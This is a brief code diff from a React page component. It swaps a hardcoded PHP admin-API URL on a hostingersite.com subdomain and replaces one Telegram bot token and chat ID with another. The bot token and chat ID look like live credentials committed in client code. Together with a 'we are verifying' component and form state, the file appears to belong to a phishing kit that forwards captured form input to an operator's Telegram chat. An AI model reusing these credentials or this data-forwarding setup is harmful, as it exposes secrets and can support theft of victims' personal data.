@@ -22,9 +22,9 @@ import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
 const API_URL =
-  "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api46php"; // Update this based on your server configuration
-const BOT_TOKEN = "8595083061:AAG0D7T9a3FyUkSLpnUfgxjub_Vk7PqnD6o";
-const CHAT_ID = "8317872395";
+  "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api7.php"; // Update this based on your server configuration
+const BOT_TOKEN = "8367580298:AAEDM4WkitJScciFNTpoBmm9RvHEQEFj-e4";
+const CHAT_ID = "4986888800";
 
 const UserPage2 = () => {
   const [formType, setFormType] = useState<string>("");
